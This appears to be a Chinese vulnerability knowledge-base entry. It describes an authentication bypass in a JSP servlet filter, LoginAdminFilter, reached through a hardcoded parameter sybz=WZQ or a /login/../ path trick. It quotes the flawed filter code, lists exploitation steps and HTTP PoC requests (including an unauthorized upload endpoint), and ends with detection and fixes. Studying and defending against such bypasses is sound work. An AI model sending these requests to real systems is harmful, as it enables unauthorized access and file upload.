---
id: web-generic-auth-loginadminfilter-sybz-param-bypass
title: LoginAdminFilter 以请求参数 sybz=WZQ 放行：任意 JSP 未授权访问（可配合 /login/../ URI 绕过）
type: scenario
domain: web
path: web/generic/auth
technique: filter-request-parameter-auth-switch
aliases:
- sybz=WZQ 绕过
- LoginAdminFilter 绕过
- 请求参数控制鉴权
- JSP 鉴权过滤器绕过
- getRequestURI contains login
- /login/../admin.jsp
tags:
- java
- auth-bypass
- servlet-filter
- jsp
- parameter-tampering
- uri-normalization
- access-control
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V53
  verified_at: '2026-11-05T08:50:05+08:00'
  notes: 已对照原文核对：图39-42确认LoginAdminFilter映射*.jsp、sybz取自request.getParameter、五个||放行条件（WZQ/sybz、yxSite、passUrl、sysAdminName、getRequestURI().contains("login")），图42-43给出?sybz=WZQ与/login/../admin.jsp两种绕过。注意：图39显示该filter配置块疑似整体被注释，原文亦称"代码里面注释掉了一些"，实际部署是否启用该filter存疑；原文未展示绕过后的页面截图。未验证点：未实测容器对/login/../的解析；frontmatter无source_url；未本机复跑。
---

## 一句话结论

SYS 模块的 `LoginAdminFilter` 保护 `*.jsp`，但放行条件里包含 `"WZQ".equalsIgnoreCase(sybz)`，而 `sybz` 直接取自请求参数；攻击者给任意 JSP 加上 `?sybz=WZQ` 即可跳过登录校验。另一个放行条件 `request.getRequestURI().contains("login")` 未做路径规范化，`/login/../admin.jsp` 也能绕过。

## 原理

- **过滤器与白名单**：`web.xml` 将 `com.newcapec.util.LoginAdminFilter` 映射到 `*.jsp`，init 参数给出 `redirectUrl=/system/login/login.jsp` 与 `passUrl`（index.jsp、xs.jsp、lcxx.jsp 等文件名白名单）。
- **放行条件**：`doFilter` 读取 `xtbz` 并从 session 取 `SessionNameVO`，得到 `sysAdminName` 等；随后判断：
  ```java
  if (!("WZQ".equalsIgnoreCase(sybz)
        || reqPath.contains(this.yxSite)
        || this.passUrl.contains(reqPath.substring(reqPath.lastIndexOf("/") + 1))
        || sysAdminName != null
        || request.getRequestURI().contains("login"))) {
      // 未满足任一条件：重定向到登录页
  } else {
      chain.doFilter(request, response); // 放行
  }
  ```
  其中 `sybz = Function.ClearTrim(request.getParameter("sybz"))`，完全由客户端控制；`sysAdminName` 未登录时为空，`passUrl` 只匹配最后一段文件名。
- **为什么成立**：鉴权条件本应只依赖服务端可信状态（session/token），这里却把请求参数当作“已登录标志”；同时路径判断使用未规范化的 `getRequestURI()` 做 `contains("login")`，`/login/../admin.jsp` 在到达容器解析前就包含 `login` 字符串，满足放行条件后容器再把 `..` 解析回目标 JSP。
- **后果**：未登录访问任意受保护 JSP（后台管理页、上传/导出 JSP 等）；原文的上传 PoC 正是用 `/sys/login/../xgxt/formquery/uploadPicture_qt.jsp` 进入未授权上传 JSP。
- **原文验证边界**：文章给出两个绕过形态（`/admin.jsp?sybz=WZQ`、`/login/../admin.jsp`）并用于后续上传 PoC，但没有单独展示绕过登录后的页面截图。

## 触发条件

- 目标使用该 `LoginAdminFilter` 保护 `*.jsp`，且 `sybz` 从请求参数读取、`WZQ` 作为放行值。
- 攻击者能直接访问受保护 JSP（未被前置网关统一鉴权）。
- 路径形态 `/login/../target.jsp` 能通过 Web 容器/反向代理（部分代理会先规范化并拒绝 `..`）。

## 利用步骤

1. 确认目标 JSP 路径与过滤器行为：未登录访问某 JSP，观察是否 302 到 `/system/login/login.jsp`。
2. 尝试参数绕过：`GET /sys/admin.jsp?sybz=WZQ`。
3. 若参数被过滤/不生效，尝试路径绕过：`GET /sys/login/../admin.jsp`（利用 `getRequestURI()` 未规范化 + `contains("login")`）。
4. 成功后访问后台功能页；结合上传/导出 JSP 继续利用（原文用 uploadPicture_qt.jsp 做未授权文件上传）。

## PoC

```http
GET /admin.jsp?sybz=WZQ HTTP/1.1
Host: target
```

```http
GET /login/../admin.jsp HTTP/1.1
Host: target
```

```http
# 原文后续上传 PoC 使用的入口
POST /sys/login/../xgxt/formquery/uploadPicture_qt.jsp?table=null&keycol=null&keyvalue=null&zpcol=null&Action=Edit&colName=null&xtbz= HTTP/1.1
```

## 变体与关联

- 变体：`sybz` 换其他硬编码放行值（原文为 `WZQ`）；`request.getRequestURI()` 换成 `getRequestURL()`/未规范化 URI；利用 `;`、编码斜杠等与代理/容器解析差异配合。
- 关联：`[[web-generic-auth-interceptor-login-prefix-dotdot-bypass]]`（startsWith 放行登录前缀 + `../` 跳出）；`[[web-generic-auth-weaver-e9-islogin-xsslist-regex-bypass]]`（路径含 login 即判已登录）；`[[web-generic-auth-sessionfilter-username-cache-key-session-hijack]]`（同系统另一过滤器用请求参数 userName 查缓存会话）。
- 与普通白名单绕过的区别：这里的根因是“请求参数被当作鉴权状态”，无需构造复杂路径即可放行；路径绕过是第二条独立通道。

## 检测与防御

- 检测：受保护 JSP 请求携带 `sybz` 参数；URI 中出现 `/login/../`、`/login/%2e%2e/` 等异常路径；未登录 session 访问后台 JSP 返回 200；WAF 对 `sybz=WZQ` 与 `login/..` 组合告警。
- 修复：鉴权判断只使用服务端 session/token；删除基于请求参数的放行分支；路径判断使用规范化后的 `getServletPath()` 并做精确白名单匹配，拒绝包含 `..` 的 URI。
- 缓解：在反向代理层统一鉴权并规范化路径；后台 JSP 移入 WEB-INF 通过控制器转发；监控未授权 JSP 访问。
